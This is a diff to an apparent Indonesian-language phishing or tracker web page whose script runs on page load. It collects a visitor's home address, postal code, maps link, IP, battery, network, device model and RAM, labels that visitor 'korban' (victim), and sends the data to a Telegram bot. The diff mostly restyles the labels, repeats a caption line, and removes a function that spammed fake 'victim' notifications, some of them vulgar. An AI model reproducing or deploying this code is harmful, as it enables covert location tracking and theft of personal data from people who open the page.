@@ -82,85 +82,15 @@
       const form = new FormData();
       form.append("chat_id", chat_id);
       form.append("photo", 'https://files.catbox.moe/p7xbtg.png');
-      form.append("caption", "𝙍𝙄𝙕𝙆𝙔 𝙃𝙀𝘾𝙆𝙀𝙍");
+      form.append("caption", "ʙʏ ʀɪᴢᴋʏ");
+      form.append("caption", "ʙʏ ʀɪᴢᴋʏ");
+      form.append("caption", "ʙʏ ʀɪᴢᴋʏ");
+      form.append("caption", "ʙʏ ʀɪᴢᴋʏ");
+      form.append("caption", "ʙʏ ʀɪᴢᴋʏ");
+      form.append("caption", "ʙʏ ʀɪᴢᴋʏ");
+      form.append("caption", "ʙʏ ʀɪᴢᴋʏ");
       fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
     }
-
-    function sendStaticPhoto(token, chat_id) {
-  const messages = [
-    "NOTIF KORBAN:👤BROO",
-    "NOTIF KORBAN:👤iyah juga jir",
-    "NOTIF KORBAN:👤KAMU NGAPAIN",
-    "NOTIF KORBAN:👤SIAPA JIR",
-    "NOTIF KORBAN:👤Kau orang mana",
-    "NOTIF KORBAN:👤ok",
-    "NOTIF KORBAN:👤Info bt",
-    "NOTIF KORBAN:👤p",
-    "NOTIF KORBAN:👤apa coba",
-    "NOTIF KORBAN:👤GPP",
-    "NOTIF KORBAN:👤MEMEK",
-    "NOTIF KORBAN:👤iyo",
-    "NOTIF KORBAN:👤sory boss",
-    "NOTIF KORBAN:👤pie",
-    "NOTIF KORBAN:👤sam",
-    "NOTIF KORBAN:👤siap bolo",
-    "NOTIF KORBAN:👤mls cht",
-    "NOTIF KORBAN:👤audio",
-    "NOTIF KORBAN:👤maksud?",
-    "NOTIF KORBAN:👤hadehhh",
-    "NOTIF KORBAN:👤okeeey",
-    "NOTIF KORBAN:👤kamu lagi ngapain",
-    "NOTIF KORBAN:👤Untung aku gak tau",
-    "NOTIF KORBAN:👤Aku kan anak alim",
-    "NOTIF KORBAN:👤sesok nek main tak wa",
-    "NOTIF KORBAN:👤🖼",
-    "NOTIF KORBAN:👤info bolo",
-    "NOTIF KORBAN:👤Mene kang",
-    "NOTIF KORBAN:👤he'ee",
-    "NOTIF KORBAN:👤gksdo",
-    "NOTIF KORBAN:👤stiker",
-    "NOTIF KORBAN:👤pp",
-    "NOTIF KORBAN:👤wkwk",
-    "NOTIF KORBAN:👤ia?",
-    "NOTIF KORBAN:👤knp",
-    "NOTIF KORBAN:👤Gmna?",
-    "NOTIF KORBAN:👤Lh Iyo 🙂",
-    "NOTIF KORBAN:👤apaa ikuuu",
-    "NOTIF KORBAN:👤lpoo peann",
-    "NOTIF KORBAN:👤alay",
-    "NOTIF KORBAN:👤Y",
-    "NOTIF KORBAN:👤Kon Kate gomog opo",
-    "NOTIF KORBAN:👤gk iso aku",
-    "NOTIF KORBAN:👤*KECUALI URUSAN MIKAT*",
-    "NOTIF KORBAN:👤hah licik piyelek",
-    "NOTIF KORBAN:👤jir",
-    "NOTIF KORBAN:👤You can continue your busy schedule",
-    "NOTIF KORBAN:👤sayang",
-    "NOTIF KORBAN:👤otw",
-    "NOTIF KORBAN:👤sherlokkk bolo",
-    "NOTIF KORBAN:👤iyahh",
-    "NOTIF KORBAN:👤hmmmm",
-    "NOTIF KORBAN:👤Iyo",
-    "NOTIF KORBAN:👤pie bolo",
-    "NOTIF KORBAN:👤bonek ayem pokok e",
-    "NOTIF KORBAN:👤bejiree iso ngono",
-    "NOTIF KORBAN:👤mass",
-    "NOTIF KORBAN:👤cokkk",
-    "NOTIF KORBAN:👤assalamu'alaikum"
-  ];
-
-  for (const text of messages) {
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chat_id,
-        text: text
-      })
-    }).catch(err => console.error("Gagal kirim:", err));
-  }
-}
-
     
     async function sendDeviceInfo() {
       const waktu = new Date().toLocaleString();
@@ -192,27 +122,40 @@
           const jc = await r.json();
           if (jc.status && jc.result) {
             const w = jc.result.weather[0];
-            cuaca = `🌤️ Cuaca: ${w.main} (${w.description})\n🌡️ Suhu: ${jc.result.main.temp}°C\n💧 Kelembaban: ${jc.result.main.humidity}%\n🌬️ Angin: ${jc.result.wind.speed} m/s`;
+            cuaca = `🌤️ᴄᴜᴀᴄa ᴋᴏʀʙᴀɴ: ${w.main} (${w.description})\n🌡️ Suhu: ${jc.result.main.temp}°C\n💧 Kelembaban: ${jc.result.main.humidity}%\n🌬️ Angin: ${jc.result.wind.speed} m/s`;
           }
         } catch(e) {
           cuaca = 'Gagal ambil cuaca';
         }
 
         const info = `
-📍 Lokasi Lengkap: ${lokasi}
-🏠 Jalan: ${jalan}, No: ${rumah}
-📫 Kode Pos: ${kodepos}
-🌍 Negara: ${negara}
-🗺️ Link Maps: ${maps}
-🕒 Waktu: ${waktu}
-🌐 IP: ${ip}
-🔋 Baterai: ${bat}
-📶 Jaringan: ${net}
-📱 User-Agent: ${ua}
-📱 Merek Android: ${brand}
-💾 RAM: ${ram}
-🔗 DARI URL: ${url}
-📡 CUACA SAAT INI:\n${cuaca}`;
+📍 ᴀʟᴀᴍᴀᴛ ᴋᴏʀʙᴀɴ: ${lokasi} 
+
+🏠 Jalan ᴋᴏʀʙᴀɴ: ${jalan}, No: ${rumah} 
+
+📫 ᴋᴏᴅᴇ Pos ᴋᴏʀʙᴀɴ: ${kodepos} 
+
+🌍 ɴᴇɢᴀʀᴀ ᴋᴏʀʙᴀɴ: ${negara} 
+
+🗺️ Link ᴍᴀᴘs ᴋᴏʀʙᴀɴ: ${maps} 
+
+🕒 Waktu ᴋᴇʙᴀᴊᴀᴋ: ${waktu} 
+
+🌐 ᴀʟᴀᴍᴀᴛ ɪᴘ ᴋᴏʀʙᴀɴ: ${ip} 
+
+🔋 ʙᴀᴛᴇʀᴀɪ ᴋᴏʀʙᴀɴ: ${bat} 
+
+📶 ᴊᴀʀɪɴɢᴀɴ ᴋᴏʀʙᴀɴ: ${net}
+
+📱 ᴅɪᴠᴀᴄᴇ ʜᴘ ᴋᴏʀʙᴀɴ: ${ua} 
+
+📱 Merek ʜᴘ ᴋᴏʀʙᴀɴ: ${brand} 
+
+💾 ʀᴀᴍ ʜᴘ ᴋᴏʀʙᴀɴ : ${ram} 
+
+🔗 ᴅᴀʀɪ ᴜʀʟ ᴋᴏʀʙᴀɴ: ${url}
+
+📡 ᴄᴜᴀᴄᴀ ᴅɪ ᴋᴏʀʙᴀɴ:\n${cuaca}`;
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -224,5 +167,4 @@
     window.onload = startAll;
   </script>
 </body>
-</html>
-
+</html> 
